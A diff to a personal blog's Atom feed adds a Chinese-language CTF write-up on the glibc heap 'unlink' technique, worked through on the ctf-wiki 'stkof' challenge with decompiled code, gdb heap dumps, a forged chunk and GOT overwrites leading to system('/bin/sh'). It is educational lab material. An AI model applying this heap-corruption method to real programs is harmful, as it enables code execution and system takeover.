@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://czh11.github.io</id>
     <title>Nono</title>
-    <updated>2020-12-02T10:48:42.057Z</updated>
+    <updated>2020-12-03T12:35:20.065Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://czh11.github.io"/>
     <link rel="self" href="https://czh11.github.io/atom.xml"/>
@@ -10,6 +10,197 @@
     <logo>https://czh11.github.io/images/avatar.png</logo>
     <icon>https://czh11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Nono</rights>
+    <entry>
+        <title type="html"><![CDATA[unlink]]></title>
+        <id>https://czh11.github.io/post/unlink/</id>
+        <link href="https://czh11.github.io/post/unlink/">
+        </link>
+        <updated>2020-12-03T11:41:22.000Z</updated>
+        <content type="html"><![CDATA[<p>unlink机制的利用</p>
+<p>利用思路</p>
+<p>1.UAF，可以修改free状态下smallbin或者unsorted bin的fd和bk指针</p>
+<p>2.已知位置存在一个指针指向可进行的UAF的chunk</p>
+<p>效果</p>
+<p>使得已指向UAF chunk的指针ptr变为ptr-0x18</p>
+<p>思路</p>
+<p>1.设指向UAF chunk的指针的地址为ptr</p>
+<p>2.修改fd为ptr-0x18</p>
+<p>2.修改bk为ptr-0x10</p>
+<p>3.触发unlink</p>
+<p>ptr处的指针变为ptr-0x18</p>
+<p>例子：ctfwiki-stkof</p>
+<pre><code>signed __int64 sub_4009E8()
+{
+  signed __int64 result; // rax
+  int i; // eax
+  unsigned int v2; // [rsp+8h] [rbp-88h]
+  __int64 n; // [rsp+10h] [rbp-80h]
+  char *ptr; // [rsp+18h] [rbp-78h]
+  char s; // [rsp+20h] [rbp-70h]
+  unsigned __int64 v6; // [rsp+88h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  fgets(&amp;s, 16, stdin);
+  v2 = atol(&amp;s);
+  if ( v2 &gt; 0x100000 )
+    return 0xFFFFFFFFLL;
+  if ( !::s[v2] )
+    return 0xFFFFFFFFLL;
+  fgets(&amp;s, 16, stdin);
+  n = atoll(&amp;s);
+  ptr = ::s[v2];
+  for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )
+  {
+    ptr += i;
+    n -= i;
+  }
+  if ( n )
+    result = 0xFFFFFFFFLL;
+  else
+    result = 0LL;
+  return result;
+}
+</code></pre>
+<p>存在堆溢出的情况</p>
+<p>这题在申请一个堆的时候会申请两个缓冲区，所以先申请一个堆chunk1把缓冲区申请下来，然后申请两个unsorted bin，chunk2，chunk3.</p>
+<pre><code>gdb-peda$ heap
+0x1176000 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x1011, 
+  fd = 0xa3434310a31, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1177010 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x11770b0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x411, 
+  fd = 0xa0a33, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x11774c0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1177560 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1177600 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x20a01, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+</code></pre>
+<p>然后再chunk2的数据地方伪造fake chunk，fake chunk-&gt;fd=s+0x10-0x18,fake chunk-&gt;bk=s+0x10-0x10,</p>
+<pre><code>gdb-peda$ heap
+0x1176000 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x1011, 
+  fd = 0xa3036310a320a32, 
+  bk = 0x0, 
+  fd_nextsize = 0x91, 
+  bk_nextsize = 0x602138
+}
+0x1177010 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x11770b0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x411, 
+  fd = 0xa4b4f, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x11774c0 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0xa1, 
+  fd = 0x0, 
+  bk = 0x91, 
+  fd_nextsize = 0x602138, 
+  bk_nextsize = 0x602140
+}
+0x1177560 {
+  prev_size = 0x90, 
+  size = 0xa0, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1177600 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x20a01, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+
+</code></pre>
+<p>然后进行unlink，让s[2]=s-0x8,</p>
+<pre><code>0x602140:	0x0000000000000000	0x0000000001177020
+0x602150:	0x0000000000602138	0x0000000000000000
+</code></pre>
+<p>这时对chunk2修改就是修改s[2]所指的地方，这里可以修改s[1]为free_got的地址，s[2]为puts_got的地址，s[3]为atol_got的地址，</p>
+<pre><code>gdb-peda$ x/4gx 0x0602140
+0x602140:	0x0000000000000000	0x0000000000602018
+0x602150:	0x0000000000602020	0x0000000000602080
+
+</code></pre>
+<p>这是修改chunk1就是修改s[1]所指向的地方，这里把free_got处存储的free的地址改为puts_addr,这样调用free函数实际上执行的是puts函数，这里当free(chunk2)时，实际上是打印出puts_got中存储的puts函数的地址，</p>
+<pre><code>gdb-peda$ x/4gx 0x0602140
+0x602140:	0x0000000000000000	0x0000000000602018
+0x602150:	0x0000000000602020	0x0000000000602080
+gdb-peda$ x/4gx 0x0000000000602018
+0x602018 &lt;free@got.plt&gt;:	0x0000000000400760	0x00007f5e45fa86a0
+0x602028 &lt;fread@got.plt&gt;:	0x00007f5e45fa71b0	0x0000000000400786
+</code></pre>
+<p>然后得到system与/bin/sh的地址，然后修改chunk3就是修改s[3]所指向的地方，这里把atoi_got处存储的地址改为system的地址。</p>
+<pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  int v3; // eax
+  signed int v5; // [rsp+Ch] [rbp-74h]
+  char nptr; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v7; // [rsp+78h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  alarm(0x78u);
+  while ( fgets(&amp;nptr, 10, stdin) )
+  {
+    v3 = atoi(&amp;nptr);
+</code></pre>
+<p>这样在执行atoi函数时实际执行的system函数，然后发送/bin/sh的地址，拿到flag。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[unsorted bin Attack]]></title>
         <id>https://czh11.github.io/post/unsorted-bin-attack/</id>
